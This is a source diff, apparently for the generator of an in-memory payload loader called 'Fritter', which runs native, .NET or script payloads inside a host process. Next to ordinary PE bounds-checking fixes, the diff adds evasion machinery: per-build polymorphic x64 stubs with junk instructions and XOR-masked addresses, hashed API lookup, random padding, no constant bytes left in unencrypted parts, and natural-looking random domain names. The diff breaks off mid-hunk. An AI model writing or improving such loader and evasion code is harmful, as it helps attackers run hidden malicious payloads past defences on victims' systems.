@@ -47,7 +47,13 @@
 #define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
  
 // required for each API used by the loader
-#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
+// DLLs the loader loads before resolving, by payload type. A DLL is only
+// loaded (and its API only resolved) for the payload types that call it;
+// kernel32, kernelbase and ntdll are in every process.
+#define DLL_NAMES_NET    "oleaut32;mscoree;shell32"
+#define DLL_NAMES_SCRIPT "ole32;oleaut32"
+#define DLL_NAMES_NATIVE ""
+#define DLL_NAMES_ALL    "ole32;oleaut32;mscoree;shell32"
  
 // These must be in the same order as the FRITTER_INSTANCE structure defined in fritter.h
 // Order is generated per build by tools/gen_api_shuffle into
@@ -62,6 +68,24 @@ static API_IMPORT api_imports[] = {
   #undef XAPI
   { NULL, NULL }   // sentinel
 };
+
+// Fails the build when the API list outgrows the instance: 64 hash/address
+// slots, and the loader tracks resolved slots in one 64-bit word.
+// is `name` one of the semi-colon separated names in `list`?
+static int dll_listed(const char *list, const char *name) {
+    size_t n = strlen(name);
+    while(*list) {
+      size_t l = strcspn(list, ";");
+      if(l == n && memcmp(list, name, n) == 0) return 1;
+      list += l + (list[l] == ';');
+    }
+    return 0;
+}
+
+typedef char api_table_fits_instance[
+  (sizeof(api_imports) / sizeof(api_imports[0]) - 1 <=
+   sizeof(((PFRITTER_INSTANCE)0)->api.hash) / sizeof(((PFRITTER_INSTANCE)0)->api.hash[0]) &&
+   sizeof(((PFRITTER_INSTANCE)0)->api.hash) / sizeof(((PFRITTER_INSTANCE)0)->api.hash[0]) <= 64) ? 1 : -1];
 
 // required to load .NET assemblies
 static GUID xCLSID_CorRuntimeHost = {
@@ -149,17 +173,46 @@ static PIMAGE_DATA_DIRECTORY Dirs (void *map) {
     }
 }
 
-// valid dos header?
-static int valid_dos_hdr (void *map) {
-    PIMAGE_DOS_HEADER dos = DosHdr(map);
-    
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
-    return (dos->e_lfanew != 0);
-}
+// Validate that every header the generator reads lies inside the file:
+// DOS header, NT headers, optional header, section table, and the raw
+// data range of each section. Must pass before NtHdr/Dirs/rva2ofs are used.
+static int pe_bounds_ok (void *map, uint32_t len) {
+    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)map;
+    PIMAGE_NT_HEADERS     nt;
+    PIMAGE_SECTION_HEADER sh;
+    uint64_t              lfanew, opt_off, opt_end, sec_end, min_opt;
+    uint16_t              magic;
+    DWORD                 i;
 
-// valid nt headers
-static int valid_nt_hdr (void *map) {
-    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
+    if (len < sizeof(IMAGE_DOS_HEADER)) return 0;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    if (dos->e_lfanew <= 0) return 0;
+
+    lfanew  = (uint64_t)dos->e_lfanew;
+    opt_off = lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
+    if (opt_off + sizeof(uint16_t) > len) return 0;
+
+    nt = (PIMAGE_NT_HEADERS)((uint8_t*)map + lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
+
+    opt_end = opt_off + nt->FileHeader.SizeOfOptionalHeader;
+    if (opt_end > len) return 0;
+
+    memcpy(&magic, (uint8_t*)map + opt_off, sizeof(magic));
+    if (magic == 0x20B)      min_opt = sizeof(IMAGE_OPTIONAL_HEADER64);
+    else if (magic == 0x10B) min_opt = sizeof(IMAGE_OPTIONAL_HEADER32);
+    else return 0;
+    if (nt->FileHeader.SizeOfOptionalHeader < min_opt) return 0;
+
+    sec_end = opt_end + (uint64_t)nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
+    if (nt->FileHeader.NumberOfSections == 0 || sec_end > len) return 0;
+
+    sh = (PIMAGE_SECTION_HEADER)((uint8_t*)map + opt_end);
+    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+      if (sh[i].SizeOfRawData == 0) continue;
+      if ((uint64_t)sh[i].PointerToRawData + sh[i].SizeOfRawData > len) return 0;
+    }
+    return 1;
 }
 
 static ULONG64 rva2ofs (void *base, ULONG64 rva) {
@@ -183,6 +236,16 @@ static ULONG64 rva2ofs (void *base, ULONG64 rva) {
       }
     }
     return -1;
+}
+
+// Translate an RVA to a pointer into the mapped file, or NULL unless
+// `need` bytes starting there are inside the file. Requires pe_bounds_ok.
+static uint8_t *pe_ptr (void *base, uint32_t len, ULONG64 rva, uint64_t need) {
+    ULONG64 ofs = rva2ofs(base, rva);
+
+    if (ofs == (ULONG64)-1) return NULL;
+    if (ofs > len || need > (uint64_t)len - ofs) return NULL;
+    return (uint8_t*)base + ofs;
 }
 
 #ifdef WINDOWS
@@ -213,21 +276,30 @@ static int map_file(const char *path) {
       return FRITTER_ERROR_FILE_EMPTY;
     }
     
+    // lengths are 32-bit throughout (module header, aPLib, instance)
+    if((uint64_t)fs.st_size > 0x7FFFFFFFu) {
+      DPRINT("File is too large : %s", path);
+      return FRITTER_ERROR_FILE_INVALID;
+    }
+    
     fi.fd = open(path, O_RDONLY);
     
     if(fi.fd < 0) {
       DPRINT("Unable to open %s for reading.", path);
+      fi.fd = 0;
       return FRITTER_ERROR_FILE_ACCESS;
     }
     
-    fi.len = fs.st_size;
+    fi.len = (uint32_t)fs.st_size;
     
     fi.data = mmap(NULL, fi.len, PROT_READ, MAP_PRIVATE, fi.fd, 0);
     
-    // no mapping? close file
-    if(fi.data == NULL) {
+    // no mapping? close file. mmap reports failure as MAP_FAILED, not NULL.
+    if(fi.data == NULL || fi.data == (uint8_t*)MAP_FAILED) {
       DPRINT("Unable to map file : %s", path);
+      fi.data = NULL;
       close(fi.fd);
+      fi.fd = 0;
       return FRITTER_ERROR_NO_MEMORY;
     }
     return FRITTER_ERROR_OK;
@@ -324,6 +396,58 @@ int compress_file(PFRITTER_CONFIG c) {
     return err;
 }
 
+// 1 if a native x64 image really uses static thread-local storage: it
+// has a TLS template and its code loads _tls_index. The loader cannot
+// give such an image a TLS slot, so it would read and write whatever
+// module owns slot 0 in the host. (MinGW images carry an empty 8-byte
+// template without using it, hence the code scan.)
+static int pe_uses_static_tls(void) {
+    PIMAGE_NT_HEADERS     nt  = NtHdr(fi.data);
+    PIMAGE_DATA_DIRECTORY dir = Dirs(fi.data);
+    PIMAGE_SECTION_HEADER sh;
+    uint8_t  *tls, *code;
+    uint64_t  start, end, index, base;
+    uint32_t  zero, i, n, p, idx_rva;
+    int32_t   disp;
+
+    if(dir == NULL || is32(fi.data)) return 0;
+    if(dir[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0) return 0;
+
+    // IMAGE_TLS_DIRECTORY64: start, end, index, callbacks, zero fill
+    tls = pe_ptr(fi.data, fi.len, dir[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress, 40);
+    if(tls == NULL) return 0;
+
+    memcpy(&start, tls,      8);
+    memcpy(&end,   tls + 8,  8);
+    memcpy(&index, tls + 16, 8);
+    memcpy(&zero,  tls + 32, 4);
+
+    if(end <= start && zero == 0) return 0;
+
+    base = ((PIMAGE_NT_HEADERS64)nt)->OptionalHeader.ImageBase;
+    if(index < base || index - base > 0xFFFFFFFFu) return 0;
+    idx_rva = (uint32_t)(index - base);
+
+    sh = (PIMAGE_SECTION_HEADER)((uint8_t*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+
+    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
+      if(!(sh[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
+
+      n = sh[i].SizeOfRawData;
+      if(sh[i].Misc.VirtualSize != 0 && sh[i].Misc.VirtualSize < n) n = sh[i].Misc.VirtualSize;
+      if(n < 5) continue;
+      code = fi.data + sh[i].PointerToRawData;
+
+      // look for a RIP-relative operand ([rip+disp32]) that resolves to _tls_index
+      for(p=1; p + 4 <= n; p++) {
+        if((code[p-1] & 0xC7) != 0x05) continue;
+        memcpy(&disp, code + p, 4);
+        if((uint32_t)(sh[i].VirtualAddress + p + 4 + disp) == idx_rva) return 1;
+      }
+    }
+    return 0;
+}
+
 /**
  * Function: read_file_info
  * ----------------------------
@@ -339,7 +463,6 @@ static int read_file_info(PFRITTER_CONFIG c) {
     PMDSTORAGESIGNATURE              pss;
     PIMAGE_COR20_HEADER              cor;
     DWORD                            dll, rva, cpu;
-    ULONG64                          ofs;
     PCHAR                            ext;
     int                              err = FRITTER_ERROR_OK;
 
@@ -396,14 +519,8 @@ static int read_file_info(PFRITTER_CONFIG c) {
     if(fi.type == FRITTER_MODULE_DLL ||
        fi.type == FRITTER_MODULE_EXE)
     {
-      if(!valid_dos_hdr(fi.data)) {
-        DPRINT("EXE/DLL has no valid DOS header.");
-        err = FRITTER_ERROR_FILE_INVALID;
-        goto cleanup;
-      }
-      
-      if(!valid_nt_hdr(fi.data)) {
-        DPRINT("EXE/DLL has no valid NT header.");
+      if(!pe_bounds_ok(fi.data, fi.len)) {
+        DPRINT("EXE/DLL headers are invalid or extend past the end of the file.");
         err = FRITTER_ERROR_FILE_INVALID;
         goto cleanup;
       }
@@ -442,20 +559,29 @@ static int read_file_info(PFRITTER_CONFIG c) {
           // try read the runtime version from meta header
           strncpy(fi.ver, "v4.0.30319", FRITTER_VER_LEN - 1);
           
-          ofs = rva2ofs(fi.data, rva);
-          if (ofs != -1) {
-            cor = (PIMAGE_COR20_HEADER)(ofs + fi.data);
+          cor = (PIMAGE_COR20_HEADER)pe_ptr(fi.data, fi.len, rva, sizeof(IMAGE_COR20_HEADER));
+          if (cor != NULL) {
             rva = cor->MetaData.VirtualAddress;
             if(rva != 0) {
-              ofs = rva2ofs(fi.data, rva);
-              if(ofs != -1) {
-                pss = (PMDSTORAGESIGNATURE)(ofs + fi.data);
-                DPRINT("Runtime version : %s", (char*)pss->pVersion);
-                strncpy(fi.ver, (char*)pss->pVersion, FRITTER_VER_LEN - 1);
+              pss = (PMDSTORAGESIGNATURE)pe_ptr(fi.data, fi.len, rva, sizeof(MDSTORAGESIGNATURE));
+              // the version string must lie inside the file as well
+              if(pss != NULL && pss->iVersionString != 0 &&
+                 pe_ptr(fi.data, fi.len, rva,
+                        sizeof(MDSTORAGESIGNATURE) + (uint64_t)pss->iVersionString) != NULL)
+              {
+                uint32_t n = pss->iVersionString;
+                if(n > FRITTER_VER_LEN - 1) n = FRITTER_VER_LEN - 1;
+                memset(fi.ver, 0, sizeof(fi.ver));
+                memcpy(fi.ver, pss->pVersion, n);
+                DPRINT("Runtime version : %s", fi.ver);
               }
             }
           }
         }
+      } else if(!c->allow_tls && c->tls_donor[0] == 0 && pe_uses_static_tls()) {
+        DPRINT("File uses static thread-local storage.");
+        err = FRITTER_ERROR_STATIC_TLS;
+        goto cleanup;
       }
     }
     // assign length of file and type to configuration
@@ -480,6 +606,11 @@ cleanup:
  *
  *   OUTPUT : 1 if ok, else 0
  */
+// Set when any gen_random() call fails. Most call sites draw layout or
+// junk choices and do not check the result individually; FritterCreate
+// checks this once and refuses to emit output built from bad randomness.
+static int g_rng_failed = 0;
+
 static int gen_random(void *buf, uint64_t len) {
 #if defined(WINDOWS)
     HCRYPTPROV prov;
@@ -489,11 +620,15 @@ static int gen_random(void *buf, uint64_t len) {
     if(!CryptAcquireContext(
         &prov, NULL, NULL,
         PROV_RSA_FULL,
-        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;
+        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
+      g_rng_failed = 1;
+      return 0;
+    }
 
     ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
     CryptReleaseContext(prov, 0);
     
+    if(!ok) g_rng_failed = 1;
     return ok;
 #else
     int      fd;
@@ -512,6 +647,7 @@ static int gen_random(void *buf, uint64_t len) {
       close(fd);
     }
     DPRINT("Acquired %li of %li bytes requested", r, len);
+    if(r != len) g_rng_failed = 1;
     return r == len;
 #endif
 }
@@ -526,6 +662,25 @@ static int gen_random(void *buf, uint64_t len) {
  *
  *   OUTPUT : 1 if ok, else 0  
  */
+// A name that reads like one somebody chose: two to four syllables,
+// capitalised, 4 to 12 letters.
+static int gen_domain_name(char *out) {
+    static const char cons[] = "bcdfglmnprstv", vow[] = "aeiou", tail[] = "lmnrst";
+    uint8_t r[16];
+    int     i, k = 0, n;
+
+    if(!gen_random(r, sizeof(r))) return 0;
+    n = 2 + (r[0] % 3);
+    for(i = 0; i < n; i++) {
+      out[k++] = cons[r[1 + i] % 13];
+      out[k++] = vow[r[5 + i] % 5];
+      if(r[9 + i] & 1) out[k++] = tail[(r[9 + i] >> 1) % 6];
+    }
+    out[0] = (char)(out[0] - 32);
+    out[k] = 0;
+    return 1;
+}
+
 static int gen_random_string(void *output, uint64_t len) {
     uint8_t rnd[FRITTER_MAX_NAME];
     int     i;
@@ -595,8 +750,10 @@ static int build_module(PFRITTER_CONFIG c) {
     mod->thread   = c->thread;
     mod->compress = FRITTER_COMPRESS_APLIB;
     mod->unicode  = c->unicode;
+    mod->imgbase  = c->imgbase;
     mod->zlen     = fi.zlen;
     mod->len      = fi.len;
+    mod->sum      = mod_sum(fi.data, fi.len);
     
     // DotNet assembly?
     if(mod->type == FRITTER_MODULE_NET_DLL ||
@@ -607,7 +764,7 @@ static int build_module(PFRITTER_CONFIG c) {
         // if entropy is enabled
         if(c->entropy != FRITTER_ENTROPY_NONE) { 
           // generate a random name
-          if(!gen_random_string(c->domain, FRITTER_DOMAIN_LEN)) {
+          if(!gen_domain_name(c->domain)) {
             DPRINT("gen_random_string() failed");
             err = FRITTER_ERROR_RANDOM;
             goto cleanup;
@@ -617,7 +774,7 @@ static int build_module(PFRITTER_CONFIG c) {
       DPRINT("Domain  : %s", c->domain[0] == 0 ? "Default" : c->domain);
       if(c->domain[0] != 0) {
         // Set the domain name in module
-        strncpy(mod->domain, c->domain, FRITTER_DOMAIN_LEN);
+        strncpy(mod->domain, c->domain, FRITTER_MAX_NAME-1);
       } else {
         memset(mod->domain, 0, FRITTER_DOMAIN_LEN);
       }
@@ -685,6 +842,184 @@ cleanup:
     return err;
 }
 
+static uint32_t emit_rnd_nop(uint8_t *out, uint32_t len);
+
+// op dst, src for two 64-bit registers (0x89 mov, 0x29 sub, 0x01 add, 0x31 xor, 0x39 cmp)
+static uint8_t *x_rr(uint8_t *p, uint8_t op, uint8_t dst, uint8_t src) {
+    *p++ = 0x48 | ((src >> 3) << 2) | (dst >> 3);
+    *p++ = op;
+    *p++ = 0xC0 | ((src & 7) << 3) | (dst & 7);
+    return p;
+}
+
+// mov r64, imm64; *at receives the address of the immediate
+static uint8_t *x_imm64(uint8_t *p, uint8_t r, uint8_t **at) {
+    *p++ = 0x48 | (r >> 3);
+    *p++ = 0xB8 | (r & 7);
+    *at  = p;
+    gen_random(p, 8);
+    return p + 8;
+}
+
+/* Emit the stub that stands in for RtlPcToFileHeader(rcx = pc, rdx = &base)
+ * inside a payload image: for an address in the image it stores and returns
+ * the image base, anything else goes to the real function. The loader
+ * patches three immediates (image base, image size, real function); the
+ * 64-bit ones are stored xor key[] when the stub decodes them itself.
+ * Registers, the form of every step, the order of the two tails and the
+ * padding between instructions are drawn per build. Returns bytes written
+ * (< 128). */
+static uint32_t emit_pcfh_stub(uint8_t *out, uint8_t *base_off, uint8_t *size_off,
+                               uint8_t *real_off, uint64_t key[2]) {
+    uint8_t *p = out, *at, *jcc, rnd[16], pool[5] = {0, 8, 9, 10, 11};   // rax, r8-r11
+    uint8_t A, B, T, R, T2;
+    int     i, j, pass;
+
+    gen_random(rnd, sizeof(rnd));
+    for(i = 4; i > 0; i--) {
+      j = rnd[i - 1] % (i + 1);
+      T = pool[i]; pool[i] = pool[j]; pool[j] = T;
+    }
+    A = pool[0]; B = pool[1]; T = pool[2];
+    R  = pool[rnd[9] % 5];
+    T2 = pool[(rnd[9] % 5 + 1 + rnd[10] % 4) % 5];
+    key[0] = key[1] = 0;
+
+    #define PJ(n) do { if(rnd[n] & 1) p += emit_rnd_nop(p, 1 + ((rnd[n] >> 1) & 3)); } while(0)
+
+    // A = image base
+    p = x_imm64(p, A, &at); *base_off = (uint8_t)(at - out);
+    if(rnd[4] & 1) {
+      gen_random(&key[0], 8);
+      p = x_imm64(p, T, &at); memcpy(at, &key[0], 8);
+      PJ(5);
+      p = x_rr(p, 0x31, A, T);
+    }
+    PJ(6);
+    // B = pc - base
+    if(rnd[4] & 2) {
+      p = x_rr(p, 0x89, B, 1);
+      p = x_rr(p, 0x29, B, A);
+    } else {
+      p = x_rr(p, 0x89, B, A);
+      *p++ = 0x48 | (B >> 3); *p++ = 0xF7; *p++ = 0xD8 | (B & 7);       // neg B
+      p = x_rr(p, 0x01, B, 1);
+    }
+    PJ(7);
+    // compare with the image size
+    if(rnd[4] & 4) {
+      *p++ = 0x48 | (B >> 3); *p++ = 0x81; *p++ = 0xF8 | (B & 7);       // cmp B, imm32
+      *size_off = (uint8_t)(p - out); p += 4;
+    } else {
+      if(T >> 3) *p++ = 0x41;
+      *p++ = 0xB8 | (T & 7);                                            // mov T32, imm32
+      *size_off = (uint8_t)(p - out); p += 4;
+      PJ(8);
+      p = x_rr(p, 0x39, B, T);
+    }
+
+    // two tails, in either order: inside the image / everything else
+    *p++ = (rnd[4] & 16) ? 0x73 : 0x72;                                 // jae else / jb inside
+    jcc  = p++;
+    for(pass = 0; pass < 2; pass++) {
+      if((pass == 0) == ((rnd[4] & 16) != 0)) {
+        if(A == 0) {
+          *p++ = 0x48; *p++ = 0x89; *p++ = 0x02;                        // mov [rdx], rax
+        } else if(rnd[11] & 1) {
+          *p++ = 0x48 | ((A >> 3) << 2); *p++ = 0x89; *p++ = ((A & 7) << 3) | 2;   // mov [rdx], A
+          p = x_rr(p, 0x89, 0, A);                                      // mov rax, A
+        } else {
+          p = x_rr(p, 0x89, 0, A);
+          if(rnd[11] & 2) { *p++ = 0x48; *p++ = 0x89; *p++ = 0x02; }
+          else { *p++ = 0x48 | ((A >> 3) << 2); *p++ = 0x89; *p++ = ((A & 7) << 3) | 2; }
+        }
+        *p++ = 0xC3;                                                    // ret
+      } else {
+        p = x_imm64(p, R, &at); *real_off = (uint8_t)(at - out);
+        if(rnd[4] & 8) {
+          gen_random(&key[1], 8);
+          p = x_imm64(p, T2, &at); memcpy(at, &key[1], 8);
+          PJ(12);
+          p = x_rr(p, 0x31, R, T2);
+        }
+        if(R >> 3) *p++ = 0x41;
+        *p++ = 0xFF; *p++ = 0xE0 | (R & 7);                             // jmp R
+      }
+      if(pass == 0) *jcc = (uint8_t)(p - (jcc + 1));
+    }
+    #undef PJ
+    return (uint32_t)(p - out);
+}
+
+#define PJ(n) do { if(rnd[n] & 1) p += emit_rnd_nop(p, 1 + ((rnd[n] >> 1) & 3)); } while(0)
+
+/* Emit the stub that stands in for TerminateProcess(rcx = process,
+ * edx = code) inside a payload image: the current-process handle goes to
+ * the exit replacement with the code as its argument, any other handle to
+ * the real function. The loader patches the two addresses. Returns bytes
+ * written (< 64). */
+static uint32_t emit_term_stub(uint8_t *out, uint8_t *exit_off, uint8_t *real_off) {
+    uint8_t *p = out, *at, *jcc, rnd[8], pool[3] = {0, 10, 11}, R;      // rax, r10, r11
+    int     pass;
+
+    gen_random(rnd, sizeof(rnd));
+    PJ(2);
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xF9; *p++ = 0xFF;                 // cmp rcx, -1
+    *p++ = (rnd[3] & 1) ? 0x75 : 0x74;                                  // jne real / je self
+    jcc  = p++;
+    for(pass = 0; pass < 2; pass++) {
+      R = pool[rnd[pass] % 3];
+      if((pass == 0) == ((rnd[3] & 1) != 0)) {
+        if(rnd[4] & 1) { *p++ = 0x89; *p++ = 0xD1; }                    // mov ecx, edx
+        else           { *p++ = 0x8B; *p++ = 0xCA; }
+        PJ(5);
+        p = x_imm64(p, R, &at); *exit_off = (uint8_t)(at - out);
+      } else {
+        p = x_imm64(p, R, &at); *real_off = (uint8_t)(at - out);
+      }
+      if(R >> 3) *p++ = 0x41;
+      *p++ = 0xFF; *p++ = 0xE0 | (R & 7);                               // jmp R
+      if(pass == 0) *jcc = (uint8_t)(p - (jcc + 1));
+    }
+    return (uint32_t)(p - out);
+}
+
+/* Emit the stub that stands in for GetProcAddress inside a payload image:
+ * it calls the real function and swaps three possible results (exit
+ * functions) for their replacements. The loader patches the real function
+ * and the three pairs. The stub starts with its stack allocation of *frame
+ * bytes, which is all its unwind data has to describe. Returns bytes
+ * written (< 128). */
+static uint32_t emit_gpa_stub(uint8_t *out, uint8_t *real_off, uint8_t from_off[3],
+                              uint8_t to_off[3], uint8_t *frame) {
+    uint8_t *p = out, *at, *jcc, rnd[16], R, C;
+    uint8_t callr[3] = {0, 10, 11}, cmpr[6] = {1, 2, 8, 9, 10, 11};
+    int     i;
+
+    gen_random(rnd, sizeof(rnd));
+    *frame = (uint8_t)(0x28 + 0x10 * (rnd[0] % 3));
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = *frame;               // sub rsp, frame
+    PJ(1);
+    R = callr[rnd[2] % 3];
+    p = x_imm64(p, R, &at); *real_off = (uint8_t)(at - out);
+    if(R >> 3) *p++ = 0x41;
+    *p++ = 0xFF; *p++ = 0xD0 | (R & 7);                                 // call R
+    for(i = 0; i < 3; i++) {
+      PJ(3 + i);
+      C = cmpr[rnd[6 + i] % 6];
+      p = x_imm64(p, C, &at); from_off[i] = (uint8_t)(at - out);
+      p = x_rr(p, 0x39, 0, C);                                          // cmp rax, C
+      *p++ = 0x75; jcc = p++;                                           // jne next
+      p = x_imm64(p, 0, &at); to_off[i] = (uint8_t)(at - out);          // mov rax, replacement
+      *jcc = (uint8_t)(p - (jcc + 1));
+    }
+    PJ(9);
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = *frame;               // add rsp, frame
+    *p++ = 0xC3;                                                        // ret
+    return (uint32_t)(p - out);
+}
+#undef PJ
+
 /**
  * Function: build_instance
  * ----------------------------
@@ -695,10 +1030,11 @@ cleanup:
  *   OUTPUT : Fritter error code. 
  */
 static int build_instance(PFRITTER_CONFIG c) {
-    FRITTER_CRYPT     inst_key, mod_key;
+    FRITTER_CRYPT     inst_key;
     PFRITTER_INSTANCE inst = NULL;
     int             cnt, inst_len;
     uint64_t        dll_hash;
+    const char *dll_need;
     int             err = FRITTER_ERROR_OK;
     
     DPRINT("Entering.");
@@ -707,13 +1043,11 @@ static int build_instance(PFRITTER_CONFIG c) {
     DPRINT("Allocating memory for instance");
     inst_len = sizeof(FRITTER_INSTANCE);
     
-    // if the module is embedded, add the size of module
+    // the module is embedded: add the size of module
     // that will be appended to the end of structure
-    if(c->inst_type == FRITTER_INSTANCE_EMBED) {
-      DPRINT("The size of module is %" PRIi32 " bytes. " 
-             "Adding to size of instance.", c->mod_len);
-      inst_len += c->mod_len;
-    }
+    DPRINT("The size of module is %" PRIi32 " bytes. "
+           "Adding to size of instance.", c->mod_len);
+    inst_len += c->mod_len;
     // Add random padding (0-255 bytes) to vary output size
     uint8_t inst_pad_len = 0;
     gen_random(&inst_pad_len, 1);
@@ -734,8 +1068,6 @@ static int build_instance(PFRITTER_CONFIG c) {
     // set the length of instance and pointer to it in configuration
     c->inst        = inst;
     c->inst_len    = inst->len = inst_len;
-    // set the type of instance we're creating
-    inst->type     = c->inst_type;
     // indicate if we should call RtlExitUserProcess to terminate host process
     inst->exit_opt = c->exit_opt;
     // set the Original Entry Point
@@ -744,8 +1076,6 @@ static int build_instance(PFRITTER_CONFIG c) {
     inst->entropy  = c->entropy;
     // set the headers level
     inst->headers  = c->headers;
-    // set the module length
-    inst->mod_len  = c->mod_len;
 
     // encryption enabled?
     if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
@@ -757,15 +1087,7 @@ static int build_instance(PFRITTER_CONFIG c) {
       }
       // copy local key to configuration
       memcpy(&inst->key, &inst_key, sizeof(FRITTER_CRYPT));
-      
-      DPRINT("Generating random key for module");
-      if(!gen_random(&mod_key, sizeof(FRITTER_CRYPT))) {
-        DPRINT("gen_random() failed");
-        err = FRITTER_ERROR_RANDOM;
-        goto cleanup;
-      }
-      // copy local key to configuration
-      memcpy(&inst->mod_key, &mod_key, sizeof(FRITTER_CRYPT));
+      // the stored key is made incomplete further down (key options)
       
       DPRINT("Generating random string to verify decryption");
       if(!gen_random_string(inst->sig, FRITTER_SIG_LEN)) {
@@ -783,13 +1105,40 @@ static int build_instance(PFRITTER_CONFIG c) {
     }
 
     DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
+    inst->pcfh_hash = maru("RtlPcToFileHeader", inst->iv);
+    inst->eh_len    = (uint8_t)emit_pcfh_stub(inst->eh_stub, &inst->eh_base, &inst->eh_size,
+                                              &inst->eh_real, inst->eh_key);
+    gen_random(&inst->eh_pos, sizeof(inst->eh_pos));
+    inst->mask      = (LOADER_PEB1_FN_COUNT > 1 && LOADER_PEB2_FN_COUNT > 1) ? 1 : 0;   // MASK_STUB_BUILT
+    inst->gpa_hash  = maru("GetProcAddress", inst->iv);
+    inst->term_hash = maru("TerminateProcess", inst->iv);
+    inst->tp_len    = (uint8_t)emit_term_stub(inst->tp_stub, &inst->tp_exit, &inst->tp_real);
+    inst->gp_len    = (uint8_t)emit_gpa_stub(inst->gp_stub, &inst->gp_real, inst->gp_from,
+                                             inst->gp_to, &inst->gp_frame);
     
+    dll_need = (c->mod_type == FRITTER_MODULE_NET_DLL || c->mod_type == FRITTER_MODULE_NET_EXE) ? DLL_NAMES_NET :
+               (c->mod_type == FRITTER_MODULE_VBS     || c->mod_type == FRITTER_MODULE_JS)      ? DLL_NAMES_SCRIPT :
+                                                                                                  DLL_NAMES_NATIVE;
+    inst->api_skip = 0;
     for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
       if(cnt >= (int)(sizeof(inst->api.hash)/sizeof(inst->api.hash[0]))) {
         DPRINT("api_imports exceeds FRITTER_INSTANCE.api ceiling (%zu)",
                sizeof(inst->api.hash)/sizeof(inst->api.hash[0]));
         err = FRITTER_ERROR_INVALID_PARAMETER;
         goto cleanup;
+      }
+      {
+        // an API of a DLL this payload type does not need: no hash, slot skipped
+        char   base[32];
+        size_t bl = strcspn(api_imports[cnt].module, ".");
+        if(bl < sizeof(base)) {
+          memcpy(base, api_imports[cnt].module, bl); base[bl] = 0;
+          if(dll_listed(DLL_NAMES_ALL, base) && !dll_listed(dll_need, base)) {
+            gen_random(&inst->api.hash[cnt], sizeof(inst->api.hash[cnt]));
+            inst->api_skip |= (uint64_t)1 << cnt;
+            continue;
+          }
+        }
       }
       // calculate hash for DLL string
       dll_hash = maru(api_imports[cnt].module, inst->iv);
@@ -804,11 +1153,15 @@ static int build_instance(PFRITTER_CONFIG c) {
         inst->api.hash[cnt]);
     }
     
+    // no constant bytes in the part of the instance that stays unencrypted
+    gen_random(&inst->api.hash[cnt], (sizeof(inst->api.hash)/sizeof(inst->api.hash[0]) - cnt) * sizeof(inst->api.hash[0]));
+    gen_random(&inst->hook, sizeof(inst->hook));
+
     DPRINT("Setting number of API to %" PRIi32, cnt);
     inst->api_cnt = cnt;
     
-    DPRINT("Setting DLL names to %s", DLL_NAMES);
-    strcpy(inst->dll_names, DLL_NAMES);
+    DPRINT("Setting DLL names to %s", dll_need);
+    strcpy(inst->dll_names, dll_need);
         
     // if module is .NET assembly
     if(c->mod_type == FRITTER_MODULE_NET_DLL ||
@@ -858,76 +1211,96 @@ static int build_instance(PFRITTER_CONFIG c) {
         strcpy(inst->kernelbase, "kernelbase");
         strcpy(inst->cmd_syms,   "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
       }
-      // does user want loader to run the entrypoint as a thread?
-      if(c->thread != 0) {
+      // unless the host is meant to exit with the payload, an EXE
+      // that exits must only end the thread it runs on
+      if(c->thread != 0 || c->exit_opt != FRITTER_OPT_EXIT_PROCESS) {
         DPRINT("Copying strings required to intercept exit-related API");
         // these exit-related API will be replaced with pointer to RtlExitUserThread
-        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit");
+        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit;abort;RtlExitUserProcess");
       }
     }
 
-    // decoy module path
-    strcpy(inst->decoy, c->decoy);
-    
-    // if the module will be downloaded
-    // set the URL parameter and request verb
-    if(inst->type == FRITTER_INSTANCE_HTTP) {
-      // if no module name specified
-      if(c->modname[0] == 0) {
-        // if entropy disabled
-        if(c->entropy == FRITTER_ENTROPY_NONE) {
-          // set to "AAAAAAAA"
-          memset(c->modname, 'A', FRITTER_MAX_MODNAME);
-        } else {
-          // generate a random name for module
-          // that will be saved to disk
-          DPRINT("Generating random name for module");
-          if(!gen_random_string(c->modname, FRITTER_MAX_MODNAME)) {
-            DPRINT("gen_random_string() failed");
-            err = FRITTER_ERROR_RANDOM;
-            goto cleanup;
-          }
-        }
-        DPRINT("Name for module : %s", c->modname);
-      }
-      strcpy(inst->server, c->server);
-      // append module name
-      strcat(inst->server, c->modname);
-      // set the request verb
-      strcpy(inst->http_req, "GET");
-      
-      DPRINT("Loader will attempt to download module from : %s", inst->server);
-      
-      // encrypt module?
-      if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
-        DPRINT("Encrypting module");
-        
-        c->mod->mac = maru(inst->sig, inst->iv);
-        
-        fritter_encrypt(
-          mod_key.mk, 
-          mod_key.ctr, 
-          c->mod, 
-          c->mod_len);
-      }
-    } else 
-    // if embedded, copy module to instance
-    if(inst->type == FRITTER_INSTANCE_EMBED) {
-      DPRINT("Copying module data to instance");
